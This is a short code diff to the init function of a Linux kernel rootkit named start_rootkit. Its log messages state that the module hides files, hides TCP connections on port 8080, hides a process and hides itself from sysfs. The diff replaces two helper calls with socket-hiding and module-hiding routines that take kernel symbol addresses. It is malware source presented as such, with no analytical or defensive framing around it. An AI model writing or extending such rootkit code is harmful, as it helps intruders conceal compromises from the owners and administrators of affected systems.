@@ -65,7 +65,7 @@ static int __init start_rootkit(void)
     printk(KERN_ALERT "rk: hide file secsessfully!");
     //HIDE TCP ON PORT 8080
 
-    ret = netstat_hide();
+    ret = socket_hide(tcp4_seq_show_addr);
     printk(KERN_ALERT "rk: HIDE PORT 8080!");
 
     //PROCESS HIDE
@@ -76,7 +76,7 @@ static int __init start_rootkit(void)
         return -1;
     }
     printk(KERN_ALERT "rk: hide the proces!");
-    ret = start_hide();
+    ret = hide_module(sysfs_remove_dir_addr, sysfs_create_dir_ns_addr);
     printk("module hide");
     return 0;
 
